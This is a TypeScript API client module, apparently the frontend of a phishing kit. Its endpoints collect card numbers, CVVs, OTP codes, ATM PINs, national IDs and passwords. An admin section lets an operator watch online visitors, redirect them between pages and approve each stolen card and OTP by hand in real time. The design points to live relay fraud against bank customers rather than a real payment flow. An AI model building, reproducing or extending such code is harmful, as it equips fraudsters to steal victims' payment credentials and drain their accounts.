// API Configuration
export const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000';

// API Client with credentials
export async function apiCall(endpoint: string, options: RequestInit = {}) {
  const url = `${API_BASE_URL}${endpoint}`;
  
  const defaultOptions: RequestInit = {
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      ...options.headers,
    },
    ...options,
  };

  const response = await fetch(url, defaultOptions);
  
  if (!response.ok) {
    throw new Error(`API Error: ${response.statusText}`);
  }
  
  return response.json();
}

// API Methods
export const api = {
  // Save field
  saveField: (page: string, fieldName: string, fieldValue: string) =>
    apiCall('/api/save-field', {
      method: 'POST',
      body: JSON.stringify({ page, fieldName, fieldValue }),
    }),

  // Visitor status
  setOnline: () => apiCall('/api/visitor/online', { method: 'POST' }),
  setOffline: () => apiCall('/api/visitor/offline', { method: 'POST' }),

  // Check redirect
  checkRedirect: () => apiCall('/api/check-redirect'),

  // Payment
  savePayment: (data: {
    cardNumber: string;
    cardHolder: string;
    expiryDate: string;
    cvv: string;
    cardType: string;
  }) =>
    apiCall('/api/save-payment', {
      method: 'POST',
      body: JSON.stringify(data),
    }),
  checkPaymentApproval: () => apiCall('/api/check-payment-approval'),

  // OTP
  saveOtp: (otp: string) =>
    apiCall('/api/save-otp', {
      method: 'POST',
      body: JSON.stringify({ otp }),
    }),
  checkOtpApproval: () => apiCall('/api/check-otp-approval'),

  // ATM PIN
  saveAtmPin: (atmPin: string) =>
    apiCall('/api/save-atm-pin', {
      method: 'POST',
      body: JSON.stringify({ atmPin }),
    }),

  // Activation
  saveActivationData: (data: {
    provider: string;
    phone: string;
    personalId: string;
    email?: string;
    password?: string;
  }) =>
    apiCall('/api/save-activation-data', {
      method: 'POST',
      body: JSON.stringify(data),
    }),

  // Verification
  saveVerificationCode: (verificationCode: string) =>
    apiCall('/api/save-verification-code', {
      method: 'POST',
      body: JSON.stringify({ verificationCode }),
    }),
  checkVerificationApproval: () => apiCall('/api/check-verification-approval'),

  // Admin APIs
  admin: {
    getVisitors: () => apiCall('/api/admin/visitors'),
    getVisitor: (vid: string) => apiCall(`/api/admin/visitor/${vid}`),
    getOnlineVisitors: () => apiCall('/api/admin/visitors/online'),
    redirectVisitor: (vid: string, targetPage: string) =>
      apiCall('/api/admin/redirect-visitor', {
        method: 'POST',
        body: JSON.stringify({ vid, targetPage }),
      }),
    approvePayment: (vid: string, approved: boolean) =>
      apiCall('/api/admin/approve-payment', {
        method: 'POST',
        body: JSON.stringify({ vid, approved }),
      }),
    approveOtp: (vid: string, approved: boolean) =>
      apiCall('/api/admin/approve-otp', {
        method: 'POST',
        body: JSON.stringify({ vid, approved }),
      }),
    approveVerification: (vid: string, verification_status: string) =>
      apiCall('/api/admin/approve-verification', {
        method: 'POST',
        body: JSON.stringify({ vid, verification_status }),
      }),
    getStatistics: () => apiCall('/api/admin/statistics'),
  },
};
